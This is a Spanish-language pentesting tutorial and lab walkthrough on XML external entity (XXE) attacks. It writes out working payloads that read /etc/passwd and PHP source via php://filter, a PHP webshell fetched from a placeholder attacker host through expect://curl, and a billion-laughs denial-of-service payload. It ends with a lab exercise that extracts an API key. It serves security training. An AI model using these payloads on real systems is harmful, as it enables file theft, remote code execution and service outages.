
# Local File Disclosure

Cuando una aplicación web confía en los datos XML sin filtrar de la entrada del usuario, es posible que podamos hacer referencia a un documento DTD XML externo y definir nuevas entidades XML personalizadas. Supongamos que podemos definir nuevas entidades y hacer que se muestren en la página web. En ese caso, también deberíamos poder definir entidades externas y hacer que hagan referencia a un archivo local que, cuando se muestre, debería mostrarnos el contenido de ese archivo en el servidor back-end.

Veamos cómo podemos identificar posibles vulnerabilidades XXE y explotarlas para leer archivos confidenciales del servidor back-end.

***

## <mark style="color:purple;">Identificación</mark>

El primer paso para identificar posibles vulnerabilidades XXE es encontrar páginas web que acepten una entrada de usuario en formato XML. En esta sección analizaremos un `Contact Form`:  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg" alt=""><figcaption></figcaption></figure>

Si rellenamos el formulario de contacto y hacemos clic en `Send Data`, luego interceptamos la petición HTTP con Burp, obtenemos la siguiente petición:

![solicitud xxe](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

Como podemos ver, el formulario parece estar enviando nuestros datos en formato XML al servidor web, lo que lo convierte en un objetivo potencial de prueba XXE. Supongamos que la aplicación web utiliza bibliotecas XML obsoletas y no aplica ningún filtro ni limpieza a nuestra entrada XML. En ese caso, es posible que podamos aprovechar este formulario XML para leer archivos locales.

Si enviamos el formulario sin ninguna modificación obtendremos el siguiente mensaje:

![respuesta xxe](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

Vemos que el valor del elemento `email` se nos muestra en la página. Para imprimir el contenido de un archivo externo en la página, debemos observar qué elementos se muestran, de modo que sepamos en qué elementos inyectar. En algunos casos, es posible que no se muestre ningún elemento, algo que explicaremos cómo aprovecharlo en las próximas secciones.

Por ahora, sabemos que cualquier valor que coloquemos en el elemento `<email></email>` se muestra en la respuesta HTTP. Por lo tanto, intentemos definir una nueva entidad y luego usarla como variable en el elemento `email` para ver si se reemplaza con el valor que definimos. Para ello, podemos usar lo que aprendimos en la sección anterior para definir nuevas entidades XML y agregar las siguientes líneas después de la primera línea en la entrada XML:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

{% hint style="info" %}
**Nota**: En nuestro ejemplo, la entrada XML en la solicitud HTTP no tenía ningún DTD declarado dentro de los datos XML en sí ni referenciado externamente, por lo que agregamos un nuevo DTD antes de definir nuestra entidad. Si ya estaba declarado el `DOCTYPE` en la solicitud XML, simplemente le agregaríamos el elemento `ENTITY`
{% endhint %}

Ahora, deberíamos tener una nueva entidad XML llamada `company`, a la que podemos hacer referencia con `&company;`. Por lo tanto, en lugar de utilizar nuestro correo electrónico en el elemento `email`, intentemos utilizar `&company;`, y veamos si se reemplaza con el valor que definimos ( `Inlane Freight`):

![nueva entidad](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

Como podemos ver, la respuesta utilizó el valor de la entidad que definimos (`Inlane Freight`) en lugar de mostrar `&company;`, lo que indica que podemos inyectar código XML. Por el contrario, una aplicación web no vulnerable mostraría ( `&company;`) como un valor sin formato. Esto confirma que estamos ante una aplicación web vulnerable a XXE.

{% hint style="info" %}
**Nota**: Algunas aplicaciones web pueden utilizar de forma predeterminada el formato JSON en las solicitudes HTTP, pero pueden aceptar otros formatos, incluido XML. Por lo tanto, incluso si una aplicación web envía solicitudes en formato JSON, podemos intentar cambiar el encabezado `Content-Type` a `application/xml` y luego convertir los datos JSON a XML con una [herramienta en línea](https://www.convertjson.com/json-to-xml.htm) . Si la aplicación web acepta la solicitud con datos XML, también podemos probarla contra vulnerabilidades XXE, que pueden revelar una vulnerabilidad XXE.
{% endhint %}

***

## <mark style="color:purple;">Lectura de archivos confidenciales</mark>

Ahora que podemos definir nuevas entidades XML internas, veamos si podemos definir entidades XML externas. Hacerlo es bastante similar a lo que hicimos antes, pero simplemente agregaremos la palabra clave `SYSTEM` y definiremos la ruta de referencia externa después de ella, como aprendimos en la sección anterior:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Enviemos ahora la solicitud modificada y veamos si el valor de nuestra entidad XML externa se establece en el archivo al que hacemos referencia:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

Vemos que efectivamente obtuvimos el contenido del archivo `/etc/passwd`,lo que significa que hemos explotado con éxito la vulnerabilidad XXE para leer archivos locales. Esto nos permite leer el contenido de archivos confidenciales, como archivos de configuración que pueden contener contraseñas u otros archivos confidenciales como una clave SSH `id_rsa` de un usuario específico, que puede otorgarnos acceso al servidor back-end. Puedes consultar el módulo [Local File Inclusion](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/local-file-inclusion.md) para ver qué ataques se pueden llevar a cabo mediante la divulgación de archivos locales.

{% hint style="info" %}
**Consejo**: En ciertas aplicaciones web Java, también podremos especificar un directorio en lugar de un archivo, y obtendremos en su lugar una lista de directorios, que puede ser útil para localizar archivos confidenciales.
{% endhint %}

***

## <mark style="color:purple;">Leyendo el código fuente</mark>

Otro beneficio de la divulgación de archivos locales es la capacidad de obtener el código fuente de la aplicación web. Esto nos permitiría realizar un `Pentesting Whitebox` para descubrir más vulnerabilidades en la aplicación web o, al menos, revelar configuraciones secretas como contraseñas de bases de datos o claves API.

Entonces, veamos si podemos usar el mismo ataque para leer el código fuente del archivo `index.php`, de la siguiente manera:

![archivo php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

Como podemos ver, esto no funcionó, ya que no obtuvimos ningún contenido. Esto sucedió porque el archivo al que hacemos referencia no está en un formato XML adecuado, por lo que no se puede hacer referencia a él como una entidad XML externa. Si un archivo contiene algunos de los caracteres especiales de XML (por ejemplo, `</>/&`), romperá la referencia de la entidad externa y no se utilizará para la referencia. Además, no podemos leer ningún dato binario, ya que tampoco se ajustaría al formato XML.

Afortunadamente, PHP proporciona filtros de contenedor que nos permiten `codificar en base64` ciertos recursos (incluidos los archivos), en cuyo caso la salida base64 final no debería romper el formato XML. Para ello, en lugar de utilizar `file://` como referencia, utilizaremos `php://filter/`. Con este filtro, podemos especificar el codificador `convert.base64-encode` como nuestro filtro y, a continuación, añadir un recurso de entrada (por ejemplo, `resource=index.php`), de la siguiente manera:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Con esto, podemos enviar nuestra solicitud y obtendremos la cadena codificada en base64 del archivo `index.php`:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

Podemos seleccionar la cadena base64, hacer clic en la pestaña Inspector de Burp (en el panel derecho) y nos mostrará el archivo decodificado. Para obtener más información sobre los filtros PHP, puede consultar el módulo [Local File Inclusion](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/local-file-inclusion.md).

Este truco sólo funciona con aplicaciones web PHP. En la siguiente sección se analizará un método más avanzado para leer el código fuente, que debería funcionar con cualquier tecnología web.

***

## <mark style="color:purple;">Ejecución remota de código con XXE</mark>

Además de leer archivos locales, es posible que podamos obtener la ejecución de código en el servidor remoto. El método más fácil sería buscar claves `ssh` o intentar utilizar un truco de robo de hash en aplicaciones web basadas en Windows, realizando una llamada a nuestro servidor. Si esto no funciona, es posible que aún podamos ejecutar comandos en aplicaciones web basadas en PHP a través del filtro `PHP://expect`, aunque esto requiere que el módulo PHP `expect` esté instalado y habilitado.

Si el XXE imprime directamente su salida "como se muestra en esta sección", entonces podemos ejecutar comandos básicos como `expect://id`, y la página debería imprimir la salida del comando. Sin embargo, si no tuviéramos acceso a la salida, o necesitáramos ejecutar un comando más complicado (por ejemplo, un reverse shell), entonces la sintaxis XML podría fallar y el comando podría no ejecutarse.

El método más eficiente para convertir XXE en RCE es obtener un webshell de nuestro servidor y escribirlo en la aplicación web, para luego poder interactuar con él y ejecutar comandos. Para ello, podemos empezar escribiendo un webshell PHP básico e iniciando un servidor web Python, de la siguiente manera:

```shell-session
afsh4ck@kali$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
afsh4ck@kali$ sudo python3 -m http.server 80
```

Ahora, podemos usar el siguiente código XML para ejecutar un `curl` que descargue nuestro webshell en el servidor remoto:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'NUESTRA_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

{% hint style="warning" %}
**Importante**: reemplazamos todos los espacios en el código XML anterior con `$IFS`, para evitar romper la sintaxis XML. Además, muchos otros caracteres como `|`, `>`, y `{` pueden romper el código, por lo que debemos evitar su uso.
{% endhint %}

Una vez que enviamos la solicitud, deberíamos recibir una solicitud en nuestra máquina para el archivo `shell.php`, después de lo cual podemos interactuar con el shell web en el servidor remoto para la ejecución del código.

{% hint style="info" %}
**Nota**: El módulo expect no está habilitado o instalado de manera predeterminada en los servidores PHP modernos, por lo que este ataque puede no funcionar siempre. Por este motivo, XXE suele utilizarse para divulgar archivos locales confidenciales y código fuente, lo que puede revelar vulnerabilidades adicionales o formas de obtener la ejecución del código.
{% endhint %}

***

## <mark style="color:purple;">Otros ataques XXE</mark>

Otro ataque común que se suele llevar a cabo a través de vulnerabilidades XXE es la explotación de SSRF, que se utiliza para enumerar puertos abiertos localmente y acceder a sus páginas, entre otras páginas web restringidas, a través de la vulnerabilidad XXE.

Finalmente, un uso común de los ataques XXE es provocar una denegación de servicio (DOS) al servidor web de alojamiento, con el uso del siguiente payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Esta carga útil define la entidad `a0` como `DOS`, hace referencia a ella en `a1` varias veces, hace referencia a `a1` en `a2`, y así sucesivamente hasta que la memoria del servidor back-end se agota debido a los `bucles de autorreferencia`. Sin embargo, este ataque ya no funciona con servidores web modernos (por ejemplo, Apache), ya que protegen contra la autorreferencia de entidades. Pruébelo con algún servidor vulnerable.

***

## Caso práctico

```
Objetivo: 10.129.112.252 
```

Intente leer el contenido del archivo '`connection.php`' y envíe el valor de '`api_key`' como respuesta.

<figure><img src="/files/i9mce8M1ZGjqPgUZwDC6" alt=""><figcaption></figcaption></figure>

Capturamos una petición con BurpSuite y vemos que el formulario parece estar enviando nuestros datos en formato XML al servidor web, lo que lo convierte en un objetivo potencial de prueba XXE.

<figure><img src="/files/NfYnvEPPgCF96W1ML1kN" alt=""><figcaption></figcaption></figure>

Al cambiar el mail vemos que el valor del elemento `email` se nos muestra en la página. Para imprimir el contenido de un archivo externo en la página, debemos observar qué elementos se muestran, de modo que sepamos en qué elementos inyectar.

<figure><img src="/files/8fk83WUUiXLlJ3urBwfi" alt=""><figcaption></figcaption></figure>

Vamos a agregar las siguiente líneas para definir una nueva entidad XML y en lugar de utilizar nuestro correo electrónico en el elemento `email`, intentemos utilizar `&company;`, y veamos si se reemplaza con el valor que definimos ( `Inlane Freight`):

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

<figure><img src="/files/HhaWg9WNTpeeakRcRnWy" alt=""><figcaption></figcaption></figure>

Bingo, funciona correctamente. Con esto vamos a intentar leer el contenido de `connection.php`:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```

<figure><img src="/files/w3eyXgPavNJ94M4UTUV6" alt=""><figcaption></figcaption></figure>

Nos devuelve el contenido codificado en `base64`, vamos a decodificarlo con Burp Decoder:

<figure><img src="/files/z3Upw8p6TwoQSNSZCuSP" alt=""><figcaption></figcaption></figure>

Y finalmente obtenemos la api key!

```bash
$api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg"
```
